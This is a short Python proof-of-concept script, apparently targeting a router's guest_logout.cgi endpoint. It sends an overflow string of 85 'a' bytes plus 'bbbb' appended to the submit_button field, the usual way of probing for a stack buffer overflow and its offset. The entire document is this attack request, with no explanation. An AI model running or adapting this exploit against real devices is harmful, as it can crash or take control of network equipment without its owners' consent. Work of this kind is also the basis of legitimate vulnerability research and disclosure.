from pwn import *
import requests

url = "http://192.168.117.1:8888/guest_logout.cgi"

#payload = cyclic(0x100)
payload = 85*b'a' + b'bbbb'
data = {
    b"cmac":b"aa:bb:cc:dd:ff:ee",
    b"cip":b"192.168.2.2",
    b"submit_button":b"status_guestnet.asp" + payload
}

req = requests.post(url,data=data)
print(req.status_code)